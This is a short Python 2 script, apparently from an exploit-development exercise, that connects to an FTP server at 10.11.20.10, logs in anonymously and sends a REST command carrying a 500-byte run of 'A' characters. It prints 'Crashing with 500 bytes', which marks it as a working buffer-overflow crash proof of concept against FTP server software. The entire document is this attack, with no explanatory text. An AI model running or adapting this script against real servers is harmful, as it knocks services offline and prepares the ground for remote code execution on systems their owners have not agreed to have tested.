import socket
ip="10.11.20.10"
buffer="A"*500
try:
	print "\nCrashing with 500 bytes"
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((ip,21))
	s.send("USER anonymous\r\n")
	s.recv(1024)
	s.send("PASS test\r\n")
	s.recv(1024)
	s.send("REST " + buffer + "\r\n")
	s.send("QUIT\r\n")
	s.close()
except:
	print "\nConnection error"
